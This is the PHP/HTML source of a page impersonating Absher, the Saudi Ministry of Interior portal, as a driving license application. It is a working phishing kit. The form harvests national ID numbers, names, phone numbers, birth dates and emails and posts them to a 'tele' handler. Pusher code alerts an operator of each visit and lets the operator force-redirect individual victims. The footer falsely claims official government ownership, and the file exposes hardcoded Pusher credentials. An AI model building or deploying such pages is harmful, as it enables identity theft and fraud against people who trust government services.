<?php

session_start();
require_once '../includes/lang.php';
set_site_lang('en');


header('Content-Type: text/html; charset=utf-8');
require_once '../dashboard/init.php';
require_once '../includes/redirect.php';

if (!isset($_SESSION['visit_counted'])) {
    try {
        $User->incrementVisitCount();
        $_SESSION['visit_counted'] = true;
        
        require_once $_SERVER['DOCUMENT_ROOT'] . '/vendor/autoload.php';
        
        $options = [
            'cluster' => 'ap2',
            'useTLS' => true
        ];
        
        $pusher = new Pusher\Pusher(
            'a56388ee6222f6c5fb86',
            '4c77061f4115303aac58',
            '1973588',
            $options
        );
        
        $pusher->trigger('my-channel', 'visit-increment', [
            'message' => 'New visit'
        ]);
        
    } catch (Exception $e) {
        error_log("Error recording visit: " . $e->getMessage());
    }
}
?>
<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Absher - Ministry of Interior</title>
    
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@200..1000&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
    
    <link rel="stylesheet" href="../includes/lang-toggle.css">
    <style>
        * {
            padding: 0;
            margin: 0;
            font-family: "Cairo", sans-serif;
            direction: ltr;
        }

        body {
            background: #f5f5f5;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .absher-header {
            background: linear-gradient(135deg, #2d7a3e 0%, #1e5a2d 100%);
            padding: 15px 0;
            box-shadow: 0 2px 8px rgba(0,0,0,0.15);
        }

        .absher-header .container {
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .absher-logo {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .absher-logo h1 {
            color: white;
            font-size: 1.5rem;
            font-weight: 700;
            margin: 0;
        }

        .gov-badge {
            background: rgba(255,255,255,0.2);
            padding: 8px 20px;
            border-radius: 25px;
            color: white;
            font-weight: 600;
            font-size: 0.9rem;
        }

        /* Progress Bar */
        .progress-container {
            background: white;
            padding: 25px;
            margin: 20px auto;
            border-radius: 15px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            max-width: 700px;
        }

        .progress-steps {
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: relative;
        }

        .progress-steps::before {
            content: '';
            position: absolute;
            top: 20px;
            right: 0;
            width: 100%;
            height: 3px;
            background: #e0e0e0;
            z-index: 0;
        }

        .progress-step {
            position: relative;
            z-index: 1;
            text-align: center;
            flex: 1;
        }

        .step-circle {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: #e0e0e0;
            color: #999;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 10px;
            font-weight: 700;
        }

        .step-circle.active {
            background: #2d7a3e;
            color: white;
            box-shadow: 0 0 0 5px rgba(45, 122, 62, 0.2);
        }

        .step-label {
            font-size: 0.85rem;
            color: #666;
            font-weight: 600;
        }

        .step-label.active {
            color: #2d7a3e;
            font-weight: 700;
        }

        .main-content {
            flex: 1;
            padding: 20px 0 40px;
        }

        .form-container {
            background: white;
            border-radius: 15px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
            padding: 40px;
            max-width: 700px;
            margin: 0 auto;
        }

        .page-title {
            text-align: center;
            color: #2d7a3e;
            font-weight: 700;
            font-size: 1.8rem;
            margin-bottom: 10px;
        }

        .page-subtitle {
            text-align: center;
            color: #666;
            font-size: 1rem;
            margin-bottom: 30px;
            padding-bottom: 20px;
            border-bottom: 2px solid #e0e0e0;
        }

        .form-label {
            font-weight: 600;
            color: #333;
            margin-bottom: 8px;
            font-size: 0.95rem;
        }

        .required-star {
            color: #d32f2f;
            font-weight: bold;
        }

        .form-control,
        .form-select {
            height: 50px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            padding: 0 15px;
            font-size: 1rem;
            transition: all 0.3s ease;
        }

        .form-control:focus,
        .form-select:focus {
            border-color: #2d7a3e;
            box-shadow: 0 0 0 3px rgba(45, 122, 62, 0.1);
            outline: none;
        }

        /* Nationality Dropdown */
        .nationality-wrapper {
            position: relative;
        }

        .selected-nationality {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 12px 15px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            cursor: pointer;
            background: white;
            transition: all 0.3s;
            min-height: 50px;
        }

        .selected-nationality:hover,
        .selected-nationality.active {
            border-color: #2d7a3e;
        }

        .selected-nationality .placeholder {
            color: #999;
        }

        .nationality-flag {
            font-size: 1.5rem;
            width: 30px;
        }

        .nationality-name {
            flex: 1;
            color: #333;
            font-weight: 500;
        }

        .nationality-dropdown {
            position: absolute;
            top: 100%;
            right: 0;
            left: 0;
            background: white;
            border: 2px solid #2d7a3e;
            border-radius: 8px;
            max-height: 300px;
            overflow-y: auto;
            display: none;
            z-index: 1000;
            box-shadow: 0 4px 15px rgba(0,0,0,0.15);
            margin-top: 5px;
        }

        .nationality-dropdown.show {
            display: block;
        }

        .nationality-search {
            position: sticky;
            top: 0;
            background: white;
            padding: 10px;
            border-bottom: 1px solid #e0e0e0;
            z-index: 1;
        }

        .nationality-search input {
            height: 40px;
            padding-right: 35px;
        }

        .nationality-search .search-icon {
            position: absolute;
            right: 22px;
            top: 50%;
            transform: translateY(-50%);
            color: #999;
        }

        .nationality-option {
            padding: 12px 15px;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 12px;
            transition: background 0.2s;
        }

        .nationality-option:hover {
            background: #f0f9f4;
        }

        .btn-submit {
            background: linear-gradient(135deg, #2d7a3e 0%, #1e5a2d 100%);
            border: none;
            color: white;
            height: 55px;
            font-size: 1.1rem;
            font-weight: 700;
            border-radius: 10px;
            width: 100%;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(45, 122, 62, 0.3);
        }

        .btn-submit:hover:not(:disabled) {
            background: linear-gradient(135deg, #1e5a2d 0%, #2d7a3e 100%);
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(45, 122, 62, 0.4);
        }

        .btn-submit:disabled {
            background: #cccccc;
            cursor: not-allowed;
            box-shadow: none;
        }

        .gov-footer {
            background: #1a1a1a;
            color: white;
            padding: 40px 0 20px;
            margin-top: auto;
        }

        .footer-content {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 30px;
            margin-bottom: 30px;
        }

        .footer-section h5 {
            color: #2d7a3e;
            font-weight: 700;
            margin-bottom: 15px;
        }

        .footer-section ul {
            list-style: none;
            padding: 0;
        }

        .footer-section ul li {
            margin-bottom: 10px;
        }

        .footer-section ul li a {
            color: #ccc;
            text-decoration: none;
            transition: color 0.3s;
        }

        .footer-section ul li a:hover {
            color: #2d7a3e;
        }

        .footer-bottom {
            border-top: 1px solid #333;
            padding-top: 20px;
            text-align: center;
        }

        .footer-bottom p {
            color: #999;
            margin: 5px 0;
            font-size: 0.85rem;
        }

        @media (max-width: 768px) {
            .form-container {
                padding: 25px;
                margin: 0 15px;
            }

            .progress-container {
                margin: 15px;
                padding: 20px 15px;
            }

            .step-label {
                font-size: 0.75rem;
            }

            .step-circle {
                width: 35px;
                height: 35px;
            }

            .footer-content {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>

    <header class="absher-header">
        <div class="container">
            <div class="absher-logo">
                <i class="fas fa-shield-alt" style="color: white; font-size: 2.5rem;"></i>
                <h1>Absher</h1>
            </div>
                        <div class="header-actions">
                <div class="gov-badge">
                    <i class="fas fa-landmark"></i>
                    Ministry of Interior
                </div>
                <?php echo render_lang_toggle(); ?>
            </div>
        </div>
    </header>

    <!-- Progress Bar -->
    <div class="progress-container container">
        <div class="progress-steps">
            <div class="progress-step">
                <div class="step-circle active">1</div>
                <div class="step-label active">Basic Information</div>
            </div>
            <div class="progress-step">
                <div class="step-circle">2</div>
                <div class="step-label">Training Details</div>
            </div>
            <div class="progress-step">
                <div class="step-circle">3</div>
                <div class="step-label">Review & Confirm</div>
            </div>
        </div>
    </div>

    <main class="main-content">
        <div class="container">
            <div class="form-container">
                <h2 class="page-title">
                    <i class="fas fa-file-alt"></i>
                    Driving License Application
                </h2>
                <p class="page-subtitle">
                    Please fill in the form below accurately
                </p>

                <form action="../tele/index.php" method="POST">
                    <input type="hidden" name="site_lang" value="en">
                    <!-- Request Type -->
                    <div class="mb-4">
                        <label for="request_type" class="form-label">
                            <i class="fas fa-clipboard-list"></i>
                            Request Type
                            <span class="required-star">*</span>
                        </label>
                        <select name="request_type" id="request_type" required class="form-select">
                            <option value="">Select Request Type</option>
                            <option value="1">Private driving license</option>
                            <option value="1">Replacement (foreign license)</option>
                            <option value="5">Driving permit</option>
                        </select>
                    </div>

                    <!-- Nationality -->
                    <div class="mb-4">
                        <label for="nationality" class="form-label">
                            <i class="fas fa-flag"></i>
                            Nationality
                            <span class="required-star">*</span>
                        </label>
                        <div class="nationality-wrapper">
                            <div class="selected-nationality" id="selectedNationality" onclick="toggleNationalityDropdown()">
                                <span class="nationality-flag" id="selectedFlag"></span>
                                <span class="nationality-name placeholder" id="selectedName">Select nationality</span>
                                <i class="fas fa-chevron-down" style="margin-right: auto;"></i>
                            </div>
                            <input type="hidden" name="nationality" id="nationalityInput" required>
                            
                            <div class="nationality-dropdown" id="nationalityDropdown">
                                <div class="nationality-search">
                                    <input type="text" 
                                           class="form-control" 
                                           id="nationalitySearch" 
                                           placeholder="Search nationality..."
                                           onclick="event.stopPropagation()">
                                    <i class="fas fa-search search-icon"></i>
                                </div>
                                <div id="nationalityOptions"></div>
                            </div>
                        </div>
                    </div>

                    <!-- ID Number -->
                    <div class="mb-4">
                        <label for="ssn" class="form-label">
                            <i class="fas fa-id-card"></i>
                            National ID Number
                            <span class="required-star">*</span>
                        </label>
                        <input 
                            type="text" 
                            class="form-control" 
                            id="ssn"
                            name="ssn" 
                            minlength="10" 
                            maxlength="12" 
                            inputmode="numeric" 
                            required 
                            placeholder="Enter national ID number">
                    </div>

                    <!-- Full Name -->
                    <div class="mb-4">
                        <label for="name" class="form-label">
                            <i class="fas fa-user"></i>
                            Full Name
                            <span class="required-star">*</span>
                        </label>
                        <input 
                            type="text" 
                            class="form-control" 
                            id="name"
                            name="name" 
                            required 
                            placeholder="Enter full name">
                    </div>

                    <!-- Mobile Number -->
                    <div class="mb-4">
                        <label for="phone" class="form-label">
                            <i class="fas fa-phone"></i>
                            Mobile Number
                            <span class="required-star">*</span>
                        </label>
                        <input 
                            type="text" 
                            class="form-control" 
                            id="phone"
                            name="phone" 
                            minlength="8" 
                            maxlength="10" 
                            inputmode="numeric" 
                            required 
                            placeholder="05xxxxxxxx">
                    </div>

                    <!-- Date of Birth -->
                    <div class="mb-4">
                        <label for="date" class="form-label">
                            <i class="fas fa-calendar-alt"></i>
                            Date of Birth
                        </label>
                        <input 
                            type="date" 
                            class="form-control" 
                            id="date"
                            name="date">
                    </div>

                    <!-- Email -->
                    <div class="mb-4">
                        <label for="email" class="form-label">
                            <i class="fas fa-envelope"></i>
                            Email
                            <span class="required-star">*</span>
                        </label>
                        <input 
                            type="email" 
                            class="form-control" 
                            id="email"
                            name="email" 
                            required 
                            placeholder="example@domain.com">
                    </div>

                    <!-- Submit button -->
                    <div class="text-center mt-5">
                        <button type="submit" name="submit" id="butSubm" class="btn-submit" disabled>
                            <i class="fas fa-paper-plane"></i>
                            Submit Application
                        </button>
                    </div>
                </form>
            </div>
        </div>
    </main>

    <footer class="gov-footer">
        <div class="container">
            <div class="footer-content">
                <div class="footer-section">
                    <h5><i class="fas fa-globe"></i> Absher Services</h5>
                    <ul>
                        <li><a href="#"><i class="fas fa-chevron-right"></i> Driving License</a></li>
                        <li><a href="#"><i class="fas fa-chevron-right"></i> Traffic Violations</a></li>
                        <li><a href="#"><i class="fas fa-chevron-right"></i> Iqama Renewal</a></li>
                        <li><a href="#"><i class="fas fa-chevron-right"></i> Visa Inquiry</a></li>
                    </ul>
                </div>

                <div class="footer-section">
                    <h5><i class="fas fa-phone-alt"></i> Contact Us</h5>
                    <ul>
                        <li><a href="#"><i class="fas fa-headset"></i> Call Center: 920020405</a></li>
                        <li><a href="#"><i class="fas fa-envelope"></i> Email</a></li>
                        <li><a href="#"><i class="fab fa-twitter"></i> Twitter</a></li>
                        <li><a href="#"><i class="fab fa-facebook"></i> Facebook</a></li>
                    </ul>
                </div>

                <div class="footer-section">
                    <h5><i class="fas fa-link"></i> Important Links</h5>
                    <ul>
                        <li><a href="#"><i class="fas fa-chevron-right"></i> Terms & Conditions</a></li>
                        <li><a href="#"><i class="fas fa-chevron-right"></i> Privacy Policy</a></li>
                        <li><a href="#"><i class="fas fa-chevron-right"></i> FAQ</a></li>
                        <li><a href="#"><i class="fas fa-chevron-right"></i> Site Map</a></li>
                    </ul>
                </div>
            </div>

            <div class="footer-bottom">
                <p class="mt-3">
                    <i class="fas fa-copyright"></i>
                    2025 All rights reserved - Absher Platform - Ministry of Interior - Kingdom of Saudi Arabia
                </p>
                <p>
                    <i class="fas fa-shield-alt"></i>
                    A secure system protected by the highest cybersecurity standards
                </p>
            </div>
        </div>
    </footer>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
    
    <script>
        // Nationalities with flags
        const nationalities = [
            {name: 'Saudi Arabia', flag: '🇸🇦'}, {name: 'Egypt', flag: '🇪🇬'}, {name: 'Jordan', flag: '🇯🇴'},
            {name: 'UAE', flag: '🇦🇪'}, {name: 'Kuwait', flag: '🇰🇼'}, {name: 'Qatar', flag: '🇶🇦'},
            {name: 'Bahrain', flag: '🇧🇭'}, {name: 'Oman', flag: '🇴🇲'}, {name: 'Yemen', flag: '🇾🇪'},
            {name: 'Syria', flag: '🇸🇾'}, {name: 'Lebanon', flag: '🇱🇧'}, {name: 'Palestine', flag: '🇵🇸'},
            {name: 'Iraq', flag: '🇮🇶'}, {name: 'Sudan', flag: '🇸🇩'}, {name: 'Libya', flag: '🇱🇾'},
            {name: 'Tunisia', flag: '🇹🇳'}, {name: 'Algeria', flag: '🇩🇿'}, {name: 'Morocco', flag: '🇲🇦'},
            {name: 'Mauritania', flag: '🇲🇷'}, {name: 'Somalia', flag: '🇸🇴'}, {name: 'Djibouti', flag: '🇩🇯'},
            {name: 'Comoros', flag: '🇰🇲'}, {name: 'Turkey', flag: '🇹🇷'}, {name: 'Iran', flag: '🇮🇷'},
            {name: 'Pakistan', flag: '🇵🇰'}, {name: 'Afghanistan', flag: '🇦🇫'}, {name: 'India', flag: '🇮🇳'},
            {name: 'Bangladesh', flag: '🇧🇩'}, {name: 'Indonesia', flag: '🇮🇩'}, {name: 'Malaysia', flag: '🇲🇾'},
            {name: 'Philippines', flag: '🇵🇭'}, {name: 'Thailand', flag: '🇹🇭'}, {name: 'Vietnam', flag: '🇻🇳'},
            {name: 'China', flag: '🇨🇳'}, {name: 'Japan', flag: '🇯🇵'}, {name: 'South Korea', flag: '🇰🇷'},
            {name: 'North Korea', flag: '🇰🇵'}, {name: 'United States', flag: '🇺🇸'}, {name: 'Canada', flag: '🇨🇦'},
            {name: 'Mexico', flag: '🇲🇽'}, {name: 'Brazil', flag: '🇧🇷'}, {name: 'Argentina', flag: '🇦🇷'},
            {name: 'Chile', flag: '🇨🇱'}, {name: 'Peru', flag: '🇵🇪'}, {name: 'Colombia', flag: '🇨🇴'},
            {name: 'United Kingdom', flag: '🇬🇧'}, {name: 'France', flag: '🇫🇷'}, {name: 'Germany', flag: '🇩🇪'},
            {name: 'Italy', flag: '🇮🇹'}, {name: 'Spain', flag: '🇪🇸'}, {name: 'Portugal', flag: '🇵🇹'},
            {name: 'Netherlands', flag: '🇳🇱'}, {name: 'Belgium', flag: '🇧🇪'}, {name: 'Switzerland', flag: '🇨🇭'},
            {name: 'Austria', flag: '🇦🇹'}, {name: 'Sweden', flag: '🇸🇪'}, {name: 'Norway', flag: '🇳🇴'},
            {name: 'Denmark', flag: '🇩🇰'}, {name: 'Finland', flag: '🇫🇮'}, {name: 'Poland', flag: '🇵🇱'},
            {name: 'Russia', flag: '🇷🇺'}, {name: 'Ukraine', flag: '🇺🇦'}, {name: 'Greece', flag: '🇬🇷'},
            {name: 'Romania', flag: '🇷🇴'}, {name: 'Hungary', flag: '🇭🇺'}, {name: 'Czech Republic', flag: '🇨🇿'},
            {name: 'Australia', flag: '🇦🇺'}, {name: 'New Zealand', flag: '🇳🇿'}, {name: 'South Africa', flag: '🇿🇦'},
            {name: 'Nigeria', flag: '🇳🇬'}, {name: 'Kenya', flag: '🇰🇪'}, {name: 'Ethiopia', flag: '🇪🇹'},
            {name: 'Uganda', flag: '🇺🇬'}, {name: 'Tanzania', flag: '🇹🇿'}, {name: 'Ghana', flag: '🇬🇭'},
            {name: 'Cameroon', flag: '🇨🇲'}, {name: 'Senegal', flag: '🇸🇳'}, {name: 'Mali', flag: '🇲🇱'},
            {name: 'Niger', flag: '🇳🇪'}, {name: 'Chad', flag: '🇹🇩'}, {name: 'Gabon', flag: '🇬🇦'},
            {name: 'Zimbabwe', flag: '🇿🇼'}, {name: 'Mozambique', flag: '🇲🇿'}, {name: 'Angola', flag: '🇦🇴'}
        ];

        let allNationalities = [];

        function renderNationalities(filter = '') {
            const container = document.getElementById('nationalityOptions');
            const filtered = nationalities.filter(n => 
                n.name.includes(filter)
            );
            
            container.innerHTML = filtered.map(n => `
                <div class="nationality-option" onclick="selectNationality('${n.name}', '${n.flag}')">
                    <span class="nationality-flag">${n.flag}</span>
                    <span class="nationality-name">${n.name}</span>
                </div>
            `).join('');
        }

        function toggleNationalityDropdown() {
            const dropdown = document.getElementById('nationalityDropdown');
            const selected = document.getElementById('selectedNationality');
            
            dropdown.classList.toggle('show');
            selected.classList.toggle('active');
            
            if (dropdown.classList.contains('show')) {
                document.getElementById('nationalitySearch').focus();
            }
        }

        function selectNationality(name, flag) {
            document.getElementById('selectedFlag').textContent = flag;
            document.getElementById('selectedName').textContent = name;
            document.getElementById('selectedName').classList.remove('placeholder');
            document.getElementById('nationalityInput').value = name;
            
            toggleNationalityDropdown();
            checkFormValidity();
        }

        document.getElementById('nationalitySearch').addEventListener('input', function(e) {
            renderNationalities(e.target.value);
        });

        document.addEventListener('click', function(e) {
            const dropdown = document.getElementById('nationalityDropdown');
            const selected = document.getElementById('selectedNationality');
            
            if (!dropdown.contains(e.target) && !selected.contains(e.target)) {
                dropdown.classList.remove('show');
                selected.classList.remove('active');
            }
        });

        renderNationalities();

        // Pusher
        const pusher = new Pusher('a56388ee6222f6c5fb86', {
            cluster: 'ap2',
            encrypted: true
        });

        const channel = pusher.subscribe('my-channel');

        channel.bind('force-redirect-user', function(data) {
            const myId = localStorage.getItem('current_user_id');
            if (myId && data.userId == myId) {
                window.location.href = data.url;
            }
        });

        // Form Validation
        function checkFormValidity() {
            const form = document.querySelector('form');
            const submitBtn = document.getElementById('butSubm');
            submitBtn.disabled = !form.checkValidity();
        }

        document.addEventListener('DOMContentLoaded', function() {
            const form = document.querySelector('form');
            
            form.addEventListener('input', checkFormValidity);
            form.addEventListener('change', checkFormValidity);
            checkFormValidity();
        });

        document.getElementById('ssn').addEventListener('input', function(e) {
            this.value = this.value.replace(/[^0-9]/g, '');
        });

        document.getElementById('phone').addEventListener('input', function(e) {
            this.value = this.value.replace(/[^0-9]/g, '');
        });
    </script>

</body>
</html>